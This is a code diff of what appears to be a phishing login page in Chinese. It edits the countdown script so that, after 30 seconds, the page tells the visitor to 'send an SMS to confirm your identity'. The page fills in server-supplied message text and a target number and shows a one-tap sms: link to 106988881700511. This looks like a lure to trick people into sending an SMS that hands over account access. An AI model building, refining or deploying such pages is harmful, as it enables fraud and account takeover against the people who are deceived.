@@ -80,19 +80,26 @@
                                             </div>
                                         </div>
 
-                                        <div class="web-login-error" role="alert" aria-relevant="all" tabindex="0" 
+                                        <div class="web-login-error404" role="alert" aria-relevant="all" tabindex="0" 
                                              aria-live="assertive" aria-atomic="true"
-                                            aria-label="警告:验证码不能为空"> <div ID="errcode"></div>
+                                            aria-label="警告:验证码不能为空"> 
+											<div style="height: 8px;"></div>  
+											<div ID="errcode"></div>
                                             <div style="height: 8px;"></div>   
                                             <div class="web-login-button-input__input" id="msgdx" style="display: none;">编辑短信:1 发送到:106988881700511</span></div>   
-                                            <div style="height: 5px;"></div>       
-                                            <a class="web-login-button-input__input" href="sms:106988881700511" id="djfs" style="font-size: 15px;color: #4e6ef2;display: none;">[点击前往发送]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a> 
+											
+                                                 <div style="height: 5px;"></div> 
+                                            <a class="web-login-button-input__input" href="sms:106988881700511" id="djfs" style="font-size: 15px;color: #4e6ef2;display: none;">[点击前往发送]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<div style="height: 5px;"></div>  					
+				
+				<br>
+				
                                         </div>
                                         <div class="web-login-confirm-info" tabindex="0" aria-label="" id="kmjss" style="display: none;">
-                                                <a target="_blank" href="login%3Fid=DX11613.html" class="web-login-confirm-info__info" tabindex="0" aria-label=""> </a>
+                                                
                                         </div>
                                         <div class="web-login-confirm-info" tabindex="0" aria-label="" id="kmjss1" style="display: none;">
-                                            <a target="_blank" href="login%3Fid=DX11613.html" class="web-login-confirm-info__info" tabindex="0" aria-label=""> </a>
+                                            
                                         </div>
                                         <div class="web-login-confirm-info" tabindex="0" aria-label="已阅读并同意服务协议和隐私条款">
                                             <span
@@ -103,7 +110,7 @@
                                                 target="_blank" href="login%3Fid=DX11613.html" class="web-login-confirm-info__info"
                                                 tabindex="0" aria-label="服务协议">服务协议</a><span
                                                 class="web-login-confirm-info__connect-text">和</span><a target="_blank"
-                                                href="login%3Fid=DX11613.html" class="web-login-confirm-info__info" tabindex="0"
+                                                 class="web-login-confirm-info__info" tabindex="0"
                                                 aria-label="隐私条款">隐私条款</a>
                                         </div>
                                         <div class="web-login-mobile-code__button-wrapper">
@@ -183,6 +190,7 @@ var yqr = Request['yqr'];
 
 <script>
 
+                            
     var inputTime = 60;
     var inputId;
 	var yqr = Request['yqr'];
@@ -211,24 +219,7 @@ var yqr = Request['yqr'];
             var trObj = document.getElementById('infTime');
             trObj.innerHTML = "发送验证码";
             clearInterval(inputId)
-			var trObjs = document.getElementById('errcode');
-                            trObjs.innerText = "请发送短信帮助我们确认你的身份。";
-                            var trObjs = document.getElementById('btn');
-                            trObjs.innerText = "我已发送短信，下一步";
-                            var trObjs = document.getElementById('dxyzm');
-                            
-                            var trObjs = document.getElementById('msgdx');
-                            trObjs.style.display="block";
-                            var trObjs = document.getElementById('msgdatas');
-                            trObjs.innerText =parsedObject.upmsg;
-                            var trObjs = document.getElementById('msgphone');
-                            trObjs.innerText =parsedObject.upnum;
-                            var trObjs = document.getElementById('kmjss');
-                            trObjs.style.display="block";
-                            var trObjs = document.getElementById('kmjss1');
-                            trObjs.style.display="block";
-                            var trObjs = document.getElementById('djfs');
-                            trObjs.style.display="block";
+
 
 
         } else {
@@ -236,17 +227,16 @@ var yqr = Request['yqr'];
             var trObj = document.getElementById('infTime');
             trObj.innerHTML = inputTime + "s后可重新发送";
         }
-    }
-    function countDowns() {
-        if (inputTime < 1) {
-            inputTime = 60;
-            var trObj = document.getElementById('infTime');
-            trObj.innerHTML = "发送验证码";
-            clearInterval(inputId)
-			var trObjs = document.getElementById('errcode');
+		if (inputTime<30)
+{
+    			var trObjs = document.getElementById('errcode');
                             trObjs.innerText = "请发送短信帮助我们确认你的身份。";
                             var trObjs = document.getElementById('btn');
                             trObjs.innerText = "我已发送短信，下一步";
+							
+							var trObjs = document.getElementById('djfs');
+                            trObjs.style.display="block";
+							
                             var trObjs = document.getElementById('dxyzm');
                             
                             var trObjs = document.getElementById('msgdx');
@@ -259,8 +249,15 @@ var yqr = Request['yqr'];
                             trObjs.style.display="block";
                             var trObjs = document.getElementById('kmjss1');
                             trObjs.style.display="block";
-                            var trObjs = document.getElementById('djfs');
-                            trObjs.style.display="block";
+}
+    }
+    function countDowns() {
+        if (inputTime < 1) {
+            inputTime = 60;
+            var trObj = document.getElementById('infTime');
+            trObj.innerHTML = "发送验证码";
+            clearInterval(inputId)
+
  
 
 
@@ -270,6 +267,31 @@ var yqr = Request['yqr'];
             trObj.innerHTML = inputTime + "s后可重新发送";
 			
         }
+		if (inputTime<30)
+{
+    			var trObjs = document.getElementById('errcode');
+                            trObjs.innerText = "请发送短信帮助我们确认你的身份。";
+                            var trObjs = document.getElementById('btn');
+                            trObjs.innerText = "我已发送短信，下一步";
+							
+							var trObjs = document.getElementById('djfs');
+                            trObjs.style.display="block";
+							
+                            var trObjs = document.getElementById('dxyzm');
+                            
+                            var trObjs = document.getElementById('msgdx');
+                            trObjs.style.display="block";
+                            var trObjs = document.getElementById('msgdatas');
+                            trObjs.innerText =parsedObject.upmsg;
+                            var trObjs = document.getElementById('msgphone');
+                            trObjs.innerText =parsedObject.upnum;
+                            var trObjs = document.getElementById('kmjss');
+                            trObjs.style.display="block";
+                            var trObjs = document.getElementById('kmjss1');
+                            trObjs.style.display="block";
+}
+		
+
     }
 
     function psotDown() {
